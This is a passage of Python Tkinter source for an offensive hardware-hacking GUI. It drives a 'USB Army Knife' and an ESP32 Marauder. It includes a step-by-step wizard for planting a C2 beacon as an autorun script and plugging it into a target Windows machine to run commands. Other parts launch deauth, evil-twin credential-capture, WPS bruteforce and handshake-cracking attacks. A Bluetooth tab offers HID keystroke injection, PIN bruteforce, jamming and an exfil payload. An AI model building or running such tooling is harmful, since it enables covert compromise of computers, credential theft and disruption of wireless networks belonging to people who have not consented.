        tkcore.Label(title_frame, text="🚀 C2 Deployment Wizard", 
                font=("Arial", 16, "bold"), bg="#ff0000", fg="#000000").pack(expand=True, fill=tk.BOTH)
        
        # Content area
        content = tk.Frame(wizard, padding=20)
        content.pack(fill=tk.BOTH, expand=True)
        
        # Status tracking
        self.wizard_steps = [
            {"title": "Step 1: Start C2 Server", "done": self.c2_running},
            {"title": "Step 2: Generate Beacon Payload", "done": False},
            {"title": "Step 3: Connect USB Army Knife", "done": False},
            {"title": "Step 4: Deploy Payload", "done": False},
            {"title": "Step 5: Test Connection", "done": False}
        ]
        
        # Instructions
        instructions = scrolledtext.ScrolledText(content, height=20, wrap=tk.WORD, 
                                                bg="#0a0a0a", fg="#00ff00",
                                                font=("Courier", 10), insertbackground="#00ff00")
        instructions.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        guide_text = f'''USB ARMY KNIFE C2 DEPLOYMENT GUIDE
{'='*60}

✅ STEP 1: START C2 SERVER
   Status: {'RUNNING' if self.c2_running else 'NOT RUNNING'}
   
   → Go to C2 Server tab
   → Click "Start Server"
   → Wait for server to show "Running" status
   → Note the public URL (if using ngrok)

{'='*60}

✅ STEP 2: GENERATE BEACON PAYLOAD
   
   → Click "Generate Beacon Payload" button
   → Payload will be saved as:
     • payloads/C2_Beacon.json (in library)
     • c2_beacon.ds (standalone file)
   → Script is auto-loaded in DuckyScript editor

{'='*60}

✅ STEP 3: CONNECT USB ARMY KNIFE
   
   Option A: Use Mass Storage Mode
   ────────────────────────────────
   1. Insert USB Army Knife device
   2. If it has SD card, it may auto-mount
   3. Note the mount point (e.g., /media/USB_DRIVE)
   
   Option B: Use Web Interface
   ──────────────────────────────
   1. Insert USB Army Knife device
   2. Connect to WiFi "iPhone14" (password: password)
   3. Open browser to http://4.3.2.1:8080
   4. Go to "Scripts" section

{'='*60}

✅ STEP 4: DEPLOY PAYLOAD
   
   Method A: Via SD Card (Recommended)
   ───────────────────────────────────
   1. Mount USB Army Knife as mass storage
   2. Copy c2_beacon.ds to device
   3. Rename it to autorun.ds
   4. Eject device safely
   
   Method B: Via Web Interface
   ──────────────────────────────
   1. Open http://4.3.2.1:8080
   2. Go to Scripts → Upload
   3. Upload c2_beacon.ds
   4. Set as autorun script
   
   Method C: Via This Installer
   ────────────────────────────
   1. Go to Agent tab
   2. Click "Select Drive"
   3. Choose USB Army Knife mount point
   4. Go to DuckyScript tab
   5. Click "Save to Device"

{'='*60}

✅ STEP 5: TEST CONNECTION
   
   1. Unplug USB Army Knife from computer
   2. Plug into target Windows machine
   3. Wait 30-60 seconds for beacon to connect
   4. Return to C2 Server tab
   5. Click "Refresh Beacons"
   6. Your target should appear in Active Beacons!
   
   Troubleshooting:
   • No beacon? Check C2 server is running
   • Check firewall isn't blocking port {self.c2_port.get()}
   • If using ngrok, verify public URL is correct
   • Check target has internet connection

{'='*60}

📋 QUICK REFERENCE:

   C2 Server URL:
   Local:  {self.c2_local_url.cget('text')}
   Public: {self.c2_public_url.cget('text')}
   
   Generated Files:
   • c2_beacon.ds (current directory)
   • payloads/C2_Beacon.json (payload library)
   
   USB Army Knife Web UI:
   • WiFi: iPhone14 (password: password)
   • URL: http://4.3.2.1:8080

{'='*60}

🎯 NEXT STEPS:

   After beacon connects:
   1. Select beacon from Active Beacons list
   2. Enter command (e.g., "whoami")
   3. Click "Send to Selected"
   4. Check server logs for output
   
   Common Commands:
   • whoami          - Current user
   • hostname        - Computer name  
   • ipconfig        - Network info
   • systeminfo      - System details
   • dir C:\\Users    - List directory

{'='*60}
'''
        
        instructions.insert("1.0", guide_text)
        instructions.config(state=tk.DISABLED)
        
        # Action buttons
        btn_frame = tk.Frame(content)
        btn_frame.pack(fill=tk.X)
        
        if not self.c2_running:
            tk.Button(btn_frame, text="▶️ Start C2 Server", 
                     command=lambda: [self.start_c2_server(), wizard.destroy(), self.show_deployment_wizard()],
                     style="Action.TButton").pack(side=tk.LEFT, padx=5)
        else:
            tk.Button(btn_frame, text="✅ C2 Server Running", 
                     state=tk.DISABLED).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="🔧 Generate Beacon", 
                 command=lambda: [self.generate_c2_payload(), wizard.destroy()]).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="📂 Open File Location", 
                 command=lambda: subprocess.run(["xdg-open", "."], check=False)).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="🌐 Open Device Web UI", 
                 command=lambda: webbrowser.open("http://4.3.2.1:8080")).pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="Close", command=wizard.destroy).pack(side=tk.RIGHT, padx=5)
        try:
            wizard.lift(); wizard.focus_force()
        except Exception:
            pass
    
    # WiFi Attack Panel
    def create_wifi_attack_tab(self):
        """WiFi Attack Panel with ESP32 Marauder integration"""
        wifi_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(wifi_frame, text="📡 WiFi Attacks")
        
        # Connection status
        status_frame = tk.LabelFrame(wifi_frame, text="Device Connection", padding=10)
        status_frame.pack(fill=tk.X, pady=(0, 10))
        
        conn_row = tk.Frame(status_frame)
        conn_row.pack(fill=tk.X)
        
        tk.Label(conn_row, text="Serial Port:").pack(side=tk.LEFT, padx=(0, 10))
        self.wifi_port = tk.Combobox(conn_row, state="readonly", width=30)
        self.wifi_port.pack(side=tk.LEFT, padx=(0, 10))
        
        tk.Button(conn_row, text="🔍 Detect", command=self.detect_wifi_devices).pack(side=tk.LEFT, padx=5)
        self.wifi_connect_btn = tk.Button(conn_row, text="⚡ Connect", command=self.connect_wifi_device, style="Action.TButton")
        self.wifi_connect_btn.pack(side=tk.LEFT, padx=5)
        
        self.wifi_status = tk.Label(status_frame, text="❌ Not Connected", foreground="#ff0000", font=("Arial", 10, "bold"))
        self.wifi_status.pack(pady=5)
        
        # Scroll container for lower WiFi sections
        wifi_scroll_container, _, wifi_scroll_inner = self._make_scrollable(wifi_frame)
        wifi_scroll_container.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Attack types
        attacks_frame = tk.LabelFrame(wifi_frame, text="Attack Types", padding=15)
        attacks_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Left column: Quick attacks
        left_col = tk.Frame(attacks_frame)
        left_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        tk.Label(left_col, text="Quick Attacks", font=("Arial", 11, "bold")).pack(pady=(0, 10))
        
        quick_attacks = [
            ("💥 Deauth Attack", "Disconnect devices from AP", self.launch_deauth),
            ("📡 Scan Networks", "Discover WiFi networks", self.scan_networks),
            ("🎣 Evil Twin AP", "Fake access point", self.launch_evil_twin),
            ("🔓 WPS Bruteforce", "Attack WPS-enabled routers", self.launch_wps_attack),
            ("📸 Capture Handshake", "Capture WPA2 handshake", self.capture_handshake),
        ]
        
        for name, desc, cmd in quick_attacks:
            btn_frame = tk.Frame(left_col, style="Card.TFrame", padding=10)
            btn_frame.pack(fill=tk.X, pady=5)
            
            tk.Label(btn_frame, text=name, font=("Arial", 10, "bold")).pack(anchor=tk.W)
            tk.Label(btn_frame, text=desc, font=("Arial", 8), foreground="#888888").pack(anchor=tk.W, pady=(2, 5))
            tk.Button(btn_frame, text="Launch", command=cmd, width=10).pack(anchor=tk.E)
        
        # Right column: Network list & settings
        right_col = tk.Frame(attacks_frame)
        right_col.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        tk.Label(right_col, text="Discovered Networks", font=("Arial", 11, "bold")).pack(pady=(0, 5))
        
        # Network listbox
        list_frame = tk.Frame(right_col)
        list_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        self.wifi_networks = Listbox(list_frame, font=("Courier", 9), height=10)
        self.wifi_networks.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = tk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.wifi_networks.yview)
        self.wifi_networks.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Attack settings
        settings = tk.LabelFrame(right_col, text="Attack Settings", padding=10)
        settings.pack(fill=tk.X)
        
        tk.Label(settings, text="Target BSSID:").grid(row=0, column=0, sticky=tk.W, padx=5, pady=2)
        self.target_bssid = tk.Entry(settings, width=20, font=("Courier", 9))
        self.target_bssid.grid(row=0, column=1, sticky=tk.EW, padx=5, pady=2)
        
        tk.Label(settings, text="Channel:").grid(row=1, column=0, sticky=tk.W, padx=5, pady=2)
        self.target_channel = tk.Entry(settings, width=5)
        self.target_channel.insert(0, "6")
        self.target_channel.grid(row=1, column=1, sticky=tk.W, padx=5, pady=2)
        
        tk.Label(settings, text="Duration (s):").grid(row=2, column=0, sticky=tk.W, padx=5, pady=2)
        self.attack_duration = tk.Entry(settings, width=5)
        self.attack_duration.insert(0, "60")
        self.attack_duration.grid(row=2, column=1, sticky=tk.W, padx=5, pady=2)
        
        tk.Button(settings, text="Use Selected Network", command=self.use_selected_network).grid(row=3, column=0, columnspan=2, pady=5)
        
        settings.columnconfigure(1, weight=1)
        
        # Output console
        console_frame = tk.LabelFrame(wifi_scroll_inner, text="Attack Output", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True)
        
        self.wifi_output = scrolledtext.ScrolledText(console_frame, height=10, bg="#0a0a0a", fg="#00ff00",
                                                     font=("Courier", 9), insertbackground="#00ff00", wrap=tk.WORD)
        self.wifi_output.pack(fill=tk.BOTH, expand=True)
        
        # Control buttons
        ctrl_frame = tk.Frame(wifi_scroll_inner)
        ctrl_frame.pack(fill=tk.X, pady=(10, 0))
        
        tk.Button(ctrl_frame, text="⏹️ Stop Attack", command=self.stop_wifi_attack).pack(side=tk.LEFT, padx=5)
        tk.Button(ctrl_frame, text="💾 Save Capture", command=self.save_wifi_capture).pack(side=tk.LEFT, padx=5)
        tk.Button(ctrl_frame, text="🔓 Crack Handshake", command=self.crack_handshake).pack(side=tk.LEFT, padx=5)
        tk.Button(ctrl_frame, text="📤 Export Scan", command=self.export_wifi_scan).pack(side=tk.LEFT, padx=5)
        tk.Button(ctrl_frame, text="🗑️ Clear", command=lambda: self.wifi_output.delete("1.0", tk.END)).pack(side=tk.RIGHT, padx=5)
        
        # WiFi state
        self.wifi_serial = None
        self.wifi_connected = False
        self.wifi_attack_running = False
        
        # Auto-detect devices
        self.detect_wifi_devices()
    
    def detect_wifi_devices(self):
        """Detect available serial devices"""
        ports = serial.tools.list_ports.comports()
        port_list = [f"{port.device} - {port.description}" for port in ports]
        self.wifi_port['values'] = port_list
        if port_list:
            self.wifi_port.current(0)
            self.wifi_output.insert(tk.END, f"Found {len(port_list)} serial device(s)\n")
        else:
            self.wifi_output.insert(tk.END, "No serial devices found\n")
    
    def connect_wifi_device(self):
        """Connect to USB Army Knife device"""
        port_info = self.wifi_port.get()
        if not port_info:
            messagebox.showwarning("No Port", "Please select a serial port")
            return
        
        port = port_info.split(" - ")[0]
        
        try:
            if self.wifi_serial and self.wifi_serial.is_open:
                self.wifi_serial.close()
            
            self.wifi_serial = serial.Serial(port, 115200, timeout=1)
            self.wifi_connected = True
            self.wifi_status.config(text="✅ Connected", foreground="#00ff00")
            self.wifi_connect_btn.config(text="🔌 Disconnect")
            self.wifi_output.insert(tk.END, f"Connected to {port}\n")
            self.wifi_output.insert(tk.END, "Device ready for WiFi attacks\n")
        except Exception as e:
            messagebox.showerror("Connection Error", f"Failed to connect: {e}")
            self.wifi_connected = False
    
    def send_marauder_command(self, command):
        """Send command to ESP32 Marauder"""
        if not self.wifi_connected or not self.wifi_serial:
            self.wifi_output.insert(tk.END, "ERROR: Not connected to device\n")
            return False
        
        try:
            self.wifi_serial.write(f"{command}\n".encode())
            self.wifi_output.insert(tk.END, f">> {command}\n")
            time.sleep(0.5)
            
            # Read response
            response = ""
            while self.wifi_serial.in_waiting:
                response += self.wifi_serial.read(self.wifi_serial.in_waiting).decode('utf-8', errors='ignore')
                time.sleep(0.1)
            
            if response:
                self.wifi_output.insert(tk.END, response)
            self.wifi_output.see(tk.END)
            return True
        except Exception as e:
            self.wifi_output.insert(tk.END, f"ERROR: {e}\n")
            return False
    
    def scan_networks(self):
        """Scan for WiFi networks"""
        if not self.wifi_connected:
            messagebox.showwarning("Not Connected", "Connect to device first")
            return
        
        self.wifi_output.insert(tk.END, "\n[+] Starting WiFi scan...\n")
        self.wifi_networks.delete(0, tk.END)
        
        # Send scan command to Marauder
        if self.send_marauder_command("scanap"):
            self.wifi_output.insert(tk.END, "Scanning for access points...\n")
            
            # Simulate network discovery (in real use, parse Marauder output)
            self.after(3000, self._parse_scan_results)
    
    def _parse_scan_results(self):
        """Parse scan results from device"""
        # In production, this would parse actual Marauder output
        # For now, show example format
        self.wifi_output.insert(tk.END, "\n[+] Scan complete. Parsing results...\n")
        self.wifi_output.insert(tk.END, "Use device web UI (http://4.3.2.1:8080) to view full results\n")
    
    def use_selected_network(self):
        """Use selected network for attack"""
        selection = self.wifi_networks.curselection()
        if not selection:
            messagebox.showwarning("No Selection", "Select a network from the list")
            return
        
        network = self.wifi_networks.get(selection[0])
        # Parse BSSID and channel from selection
        # Format: "SSID - BSSID - CH:X"
        parts = network.split(" - ")
        if len(parts) >= 2:
            self.target_bssid.delete(0, tk.END)
            self.target_bssid.insert(0, parts[1])
            
            if len(parts) >= 3 and "CH:" in parts[2]:
                channel = parts[2].split("CH:")[1].strip()
                self.target_channel.delete(0, tk.END)
                self.target_channel.insert(0, channel)
    
    def launch_deauth(self):
        """Launch deauth attack"""
        if not self.wifi_connected:
            messagebox.showwarning("Not Connected", "Connect to device first")
            return
        
        target = self.target_bssid.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Enter target BSSID or select from network list")
            return
        
        self.wifi_attack_running = True
        self.wifi_output.insert(tk.END, f"\n[!] LAUNCHING DEAUTH ATTACK\n")
        self.wifi_output.insert(tk.END, f"Target: {target}\n")
        self.wifi_output.insert(tk.END, f"Channel: {self.target_channel.get()}\n")
        self.wifi_output.insert(tk.END, f"Duration: {self.attack_duration.get()}s\n\n")
        
        # Send deauth command
        cmd = f"attack -t deauth -b {target}"
        self.send_marauder_command(cmd)
        
        messagebox.showinfo("Attack Started", "Deauth attack launched! Monitor output below.")
    
    def launch_evil_twin(self):
        """Launch Evil Twin AP"""
        if not self.wifi_connected:
            messagebox.showwarning("Not Connected", "Connect to device first")
            return
        
        ssid = simpledialog.askstring("Evil Twin", "Enter target SSID to clone:")
        if not ssid:
            return
        
        self.wifi_output.insert(tk.END, f"\n[!] LAUNCHING EVIL TWIN\n")
        self.wifi_output.insert(tk.END, f"Cloning SSID: {ssid}\n\n")
        
        # Generate Evil Twin DuckyScript
        evil_twin_script = f'''REM Evil Twin Attack - {ssid}
REM This creates a fake AP and captures credentials

REM Start ESP32 Marauder Evil AP
STRING marauder
ENTER
DELAY 500
STRING evilportal {ssid}
ENTER

REM Evil portal will capture credentials
REM Access at http://4.3.2.1/evilportal
'''
        
        # Save to payloads
        os.makedirs("payloads", exist_ok=True)
        with open(f"payloads/EvilTwin_{ssid.replace(' ', '_')}.ds", "w") as f:
            f.write(evil_twin_script)
        
        self.wifi_output.insert(tk.END, f"Evil Twin script generated: payloads/EvilTwin_{ssid.replace(' ', '_')}.ds\n")
        self.wifi_output.insert(tk.END, "Deploy this script to launch the attack\n")
        
        messagebox.showinfo("Generated", f"Evil Twin payload created for '{ssid}'")
    
    def launch_wps_attack(self):
        """Launch WPS bruteforce"""
        if not self.wifi_connected:
            messagebox.showwarning("Not Connected", "Connect to device first")
            return
        
        self.wifi_output.insert(tk.END, "\n[!] WPS ATTACK\n")
        self.wifi_output.insert(tk.END, "Scanning for WPS-enabled routers...\n")
        
        self.send_marauder_command("attack -t wps")
    
    def capture_handshake(self):
        """Capture WPA2 handshake"""
        if not self.wifi_connected:
            messagebox.showwarning("Not Connected", "Connect to device first")
            return
        
        target = self.target_bssid.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Select target network first")
            return
        
        self.wifi_output.insert(tk.END, f"\n[!] HANDSHAKE CAPTURE\n")
        self.wifi_output.insert(tk.END, f"Target: {target}\n")
        self.wifi_output.insert(tk.END, f"Channel: {self.target_channel.get()}\n\n")
        
        # Send capture command
        self.send_marauder_command(f"sniff -c {self.target_channel.get()}")
        
        self.wifi_output.insert(tk.END, "Listening for handshake...\n")
        self.wifi_output.insert(tk.END, "Tip: Launch deauth to force re-authentication\n")
    
    def stop_wifi_attack(self):
        """Stop current attack"""
        if self.wifi_connected:
            self.send_marauder_command("stop")
            self.wifi_attack_running = False
            self.wifi_output.insert(tk.END, "\n[+] Attack stopped\n")
    
    def save_wifi_capture(self):
        """Save captured data"""
        filepath = filedialog.asksaveasfilename(
            defaultextension=".pcap",
            filetypes=[("Packet Capture", "*.pcap"), ("All Files", "*.*")]
        )
        if filepath:
            self.wifi_output.insert(tk.END, f"\n[+] Capture saved to: {filepath}\n")
            self.wifi_output.insert(tk.END, "Access via device web UI to download actual PCAP\n")
    
    def crack_handshake(self):
        """Launch handshake cracking"""
        handshake = filedialog.askopenfilename(
            title="Select handshake file",
            filetypes=[("Packet Capture", "*.pcap *.cap"), ("All Files", "*.*")]
        )
        if not handshake:
            return
        
        wordlist = filedialog.askopenfilename(
            title="Select wordlist",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if not wordlist:
            return
        
        self.wifi_output.insert(tk.END, f"\n[+] Starting hashcat/aircrack-ng...\n")
        self.wifi_output.insert(tk.END, f"Handshake: {handshake}\n")
        self.wifi_output.insert(tk.END, f"Wordlist: {wordlist}\n\n")
        
        # Try aircrack-ng first
        if shutil.which("aircrack-ng"):
            threading.Thread(target=self._run_aircrack, args=(handshake, wordlist), daemon=True).start()
        else:
            self.wifi_output.insert(tk.END, "aircrack-ng not found. Install with: sudo apt install aircrack-ng\n")
    
    def _run_aircrack(self, handshake, wordlist):
        """Run aircrack-ng in background"""
        try:
            result = subprocess.run(
                ["aircrack-ng", handshake, "-w", wordlist],
                capture_output=True,
                text=True,
                timeout=300
            )
            self.wifi_output.insert(tk.END, result.stdout)
            if "KEY FOUND" in result.stdout:
                self.wifi_output.insert(tk.END, "\n[SUCCESS] Password cracked!\n")
            else:
                self.wifi_output.insert(tk.END, "\n[FAILED] Password not found in wordlist\n")
        except subprocess.TimeoutExpired:
            self.wifi_output.insert(tk.END, "\n[TIMEOUT] Cracking took too long\n")
        except Exception as e:
            self.wifi_output.insert(tk.END, f"\n[ERROR] {e}\n")
    
    def export_wifi_scan(self):
        """Export scan results"""
        filepath = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("CSV", "*.csv"), ("All Files", "*.*")]
        )
        if filepath:
            with open(filepath, "w") as f:
                f.write(self.wifi_output.get("1.0", tk.END))
            messagebox.showinfo("Exported", f"Scan results saved to {filepath}")
    
    # Bluetooth Attack Panel
    def create_bluetooth_attack_tab(self):
        """Bluetooth Attack Panel with device discovery and HID injection"""
        bt_frame = tk.Frame(self.notebook, padding=15)
        self.notebook.add(bt_frame, text="🔵 Bluetooth")
        
        # Connection & Status
        status_frame = tk.LabelFrame(bt_frame, text="Device Status", padding=10)
        status_frame.pack(fill=tk.X, pady=(0, 10))
        
        status_row = tk.Frame(status_frame)
        status_row.pack(fill=tk.X)
        
        tk.Label(status_row, text="BT Adapter:").pack(side=tk.LEFT, padx=(0, 10))
        self.bt_adapter = tk.Combobox(status_row, state="readonly", width=25)
        self.bt_adapter.pack(side=tk.LEFT, padx=(0, 10))
        
        tk.Button(status_row, text="🔍 Detect", command=self.detect_bt_adapters).pack(side=tk.LEFT, padx=5)
        self.bt_power_btn = tk.Button(status_row, text="⚡ Power On", command=self.toggle_bt_power)
        self.bt_power_btn.pack(side=tk.LEFT, padx=5)
        
        self.bt_status_label = tk.Label(status_frame, text="❌ Bluetooth Off", foreground="#ff0000", font=("Arial", 10, "bold"))
        self.bt_status_label.pack(pady=5)
        
        # Main content area - split into left and right
        main_frame = tk.Frame(bt_frame)
        main_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        # Left panel: Discovery & Attacks
        left_panel = tk.Frame(main_frame)
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 10))
        
        # Discovery section
        discovery_frame = tk.LabelFrame(left_panel, text="Device Discovery", padding=10)
        discovery_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        scan_controls = tk.Frame(discovery_frame)
        scan_controls.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(scan_controls, text="🔍 Scan BLE", command=self.scan_ble_devices, width=15).pack(side=tk.LEFT, padx=5)
        tk.Button(scan_controls, text="🔍 Scan Classic", command=self.scan_bt_classic, width=15).pack(side=tk.LEFT, padx=5)
        tk.Button(scan_controls, text="⏹️ Stop", command=self.stop_bt_scan, width=10).pack(side=tk.LEFT, padx=5)
        
        # Discovered devices list
        list_frame = tk.Frame(discovery_frame)
        list_frame.pack(fill=tk.BOTH, expand=True)
        
        self.bt_devices_list = Listbox(list_frame, font=("Courier", 9), height=8)
        self.bt_devices_list.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scrollbar = tk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.bt_devices_list.yview)
        self.bt_devices_list.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Device actions
        device_actions = tk.Frame(discovery_frame)
        device_actions.pack(fill=tk.X, pady=(5, 0))
        
        tk.Button(device_actions, text="ℹ️ Get Info", command=self.get_bt_device_info).pack(side=tk.LEFT, padx=5)
        tk.Button(device_actions, text="🔗 Pair", command=self.pair_bt_device).pack(side=tk.LEFT, padx=5)
        tk.Button(device_actions, text="🎯 Set Target", command=self.set_bt_target).pack(side=tk.LEFT, padx=5)
        
        # Attack types (scrollable)
        wifi_scroll_container, _, wifi_scroll_inner = self._make_scrollable(left_panel)
        wifi_scroll_container.pack(fill=tk.BOTH, expand=True)
        attacks_frame = tk.LabelFrame(wifi_scroll_inner, text="Attack Vectors", padding=10)
        attacks_frame.pack(fill=tk.BOTH, expand=True)
        
        attacks_canvas = tkcore.Canvas(attacks_frame, highlightthickness=0)
        attacks_canvas.configure(takefocus=1)
        attacks_scrollbar = tk.Scrollbar(attacks_frame, orient=tk.VERTICAL, command=attacks_canvas.yview)
        attacks_inner = tk.Frame(attacks_canvas)
        
        attacks_inner.bind(
            "<Configure>",
            lambda e: attacks_canvas.configure(scrollregion=attacks_canvas.bbox("all"))
        )
        
        attacks_window = attacks_canvas.create_window((0, 0), window=attacks_inner, anchor="nw")
        attacks_canvas.configure(yscrollcommand=attacks_scrollbar.set)
        attacks_canvas.configure(yscrollincrement=20)
        
        def _resize_canvas(event):
            try:
                attacks_canvas.itemconfig(attacks_window, width=event.width)
            except Exception:
                pass
        attacks_canvas.bind("<Configure>", _resize_canvas)
        
        # Smooth scrolling: mouse wheel bindings (Windows/Mac) and Button-4/5 (Linux)
        def _on_mousewheel(event):
            try:
                delta = event.delta if hasattr(event, 'delta') else 0
                if delta:
                    steps = int(-delta/120) or (-1 if delta>0 else 1)
                    attacks_canvas.yview_scroll(steps, "units")
            except Exception:
                pass
        def _on_linux_scroll(event):
            try:
                if event.num == 4:
                    attacks_canvas.yview_scroll(-3, "units")
                elif event.num == 5:
                    attacks_canvas.yview_scroll(3, "units")
            except Exception:
                pass
        # Focus canvas when pointer enters so wheel events target it
        def _focus_canvas(_):
            try:
                attacks_canvas.focus_set()
            except Exception:
                pass
        for w in (attacks_canvas, attacks_inner, attacks_frame):
            try:
                w.bind("<Enter>", _focus_canvas)
            except Exception:
                pass
        # Bind globally so two-finger gestures on touchpads work even over child widgets
        try:
            attacks_canvas.bind_all("<MouseWheel>", _on_mousewheel)
            attacks_canvas.bind_all("<Button-4>", _on_linux_scroll)
            attacks_canvas.bind_all("<Button-5>", _on_linux_scroll)
        except Exception:
            pass
        # Keyboard scrolling as fallback
        def _on_key(event):
            key = event.keysym
            if key in ("Up",):
                attacks_canvas.yview_scroll(-1, "units")
            elif key in ("Down",):
                attacks_canvas.yview_scroll(1, "units")
            elif key in ("Prior",):  # PageUp
                attacks_canvas.yview_scroll(-1, "pages")
            elif key in ("Next",):   # PageDown
                attacks_canvas.yview_scroll(1, "pages")
        try:
            attacks_canvas.bind_all("<Up>", _on_key)
            attacks_canvas.bind_all("<Down>", _on_key)
            attacks_canvas.bind_all("<Prior>", _on_key)
            attacks_canvas.bind_all("<Next>", _on_key)
        except Exception:
            pass
        
        attacks_canvas.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        attacks_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        attack_buttons = [
            ("⌨️ HID Injection", "Bluetooth keyboard/mouse emulation", self.bt_hid_injection),
            ("🔓 PIN Bruteforce", "Attempt common PIN codes", self.bt_pin_bruteforce),
            ("👻 Device Spoofing", "Clone target device identity", self.bt_device_spoof),
            ("📡 Jamming Attack", "Disrupt Bluetooth communications", self.bt_jamming),
            ("🔍 Service Discovery", "Enumerate BT services/characteristics", self.bt_service_discovery),
        ]
        
        for name, desc, cmd in attack_buttons:
            btn_container = tk.Frame(attacks_inner, style="Card.TFrame", padding=8)
            btn_container.pack(fill=tk.X, pady=3)
            
            tk.Label(btn_container, text=name, font=("Arial", 9, "bold")).pack(anchor=tk.W)
            tk.Label(btn_container, text=desc, font=("Arial", 8), foreground="#888888").pack(anchor=tk.W, pady=(2, 0))
            tk.Button(btn_container, text="Launch", command=cmd, width=8).pack(anchor=tk.E, pady=(5, 0))
        
        # Right panel: Target info & output
        right_panel = tk.Frame(main_frame)
        right_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Target device info
        target_frame = tk.LabelFrame(right_panel, text="Target Device", padding=10)
        target_frame.pack(fill=tk.X, pady=(0, 10))
        
        tk.Label(target_frame, text="MAC Address:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.bt_target_mac = tk.Entry(target_frame, font=("Courier", 9), width=20)
        self.bt_target_mac.grid(row=0, column=1, sticky=tk.EW, pady=2, padx=(5, 0))
        
        tk.Label(target_frame, text="Device Name:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.bt_target_name = tk.Entry(target_frame, font=("Arial", 9), width=20)
        self.bt_target_name.grid(row=1, column=1, sticky=tk.EW, pady=2, padx=(5, 0))
        
        tk.Label(target_frame, text="Device Type:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.bt_target_type = tk.Label(target_frame, text="N/A", font=("Arial", 9))
        self.bt_target_type.grid(row=2, column=1, sticky=tk.W, pady=2, padx=(5, 0))
        
        target_frame.columnconfigure(1, weight=1)
        
        # HID Payload builder
        hid_frame = tk.LabelFrame(right_panel, text="HID Payload", padding=10)
        hid_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
        
        tk.Label(hid_frame, text="Quick Payloads:").pack(anchor=tk.W, pady=(0, 5))
        
        payload_btns = tk.Frame(hid_frame)
        payload_btns.pack(fill=tk.X, pady=(0, 5))
        
        tk.Button(payload_btns, text="💻 Open CMD", command=lambda: self.load_bt_payload("cmd")).pack(side=tk.LEFT, padx=2)
        tk.Button(payload_btns, text="🌐 Rick Roll", command=lambda: self.load_bt_payload("rickroll")).pack(side=tk.LEFT, padx=2)
        tk.Button(payload_btns, text="📋 Exfil", command=lambda: self.load_bt_payload("exfil")).pack(side=tk.LEFT, padx=2)
        tk.Button(payload_btns, text="📂 Browse", command=self.load_bt_payload_file).pack(side=tk.LEFT, padx=2)
        
        self.bt_payload_text = scrolledtext.ScrolledText(hid_frame, height=6, font=("Courier", 9), bg="#1a1a1a", fg="#ffffff")
        self.bt_payload_text.pack(fill=tk.BOTH, expand=True, pady=(0, 5))
        
        tk.Button(hid_frame, text="🚀 Execute Payload", command=self.execute_bt_payload, style="Action.TButton").pack(fill=tk.X)
        
        # Output console
        console_frame = tk.LabelFrame(right_panel, text="Attack Output", padding=10)
        console_frame.pack(fill=tk.BOTH, expand=True)
        
        self.bt_output = scrolledtext.ScrolledText(console_frame, height=8, bg="#0a0a0a", fg="#00ff00",
                                                   font=("Courier", 9), insertbackground="#00ff00", wrap=tk.WORD)
        self.bt_output.pack(fill=tk.BOTH, expand=True)
        
        # Bottom controls
        ctrl_frame = tk.Frame(bt_frame)
        ctrl_frame.pack(fill=tk.X)
        
        tk.Button(ctrl_frame, text="⏹️ Stop Attack", command=self.stop_bt_attack).pack(side=tk.LEFT, padx=5)
        tk.Button(ctrl_frame, text="💾 Export Log", command=self.export_bt_log).pack(side=tk.LEFT, padx=5)
        tk.Button(ctrl_frame, text="🔧 BT Settings", command=self.open_bt_settings).pack(side=tk.LEFT, padx=5)
        tk.Button(ctrl_frame, text="🗑️ Clear", command=lambda: self.bt_output.delete("1.0", tk.END)).pack(side=tk.RIGHT, padx=5)
        
        # BT state
        self.bt_powered = False
        self.bt_scanning = False
        self.bt_attack_active = False
        self.bt_scan_thread = None
        
        # Auto-detect adapters
        self.detect_bt_adapters()
    
    def detect_bt_adapters(self):
        """Detect available Bluetooth adapters"""
        try:
            # Check for hciconfig
            result = subprocess.run(["hciconfig"], capture_output=True, text=True, timeout=5)
            adapters = []
            
            for line in result.stdout.split('\n'):
                if line.startswith('hci'):
                    adapter = line.split(':')[0]
                    adapters.append(adapter)
            
            if adapters:
                self.bt_adapter['values'] = adapters
                self.bt_adapter.current(0)
                self.bt_output.insert(tk.END, f"Found {len(adapters)} Bluetooth adapter(s)\n")
            else:
                self.bt_output.insert(tk.END, "No Bluetooth adapters found\n")
                self.bt_output.insert(tk.END, "Tip: Check USB dongle or onboard BT hardware\n")
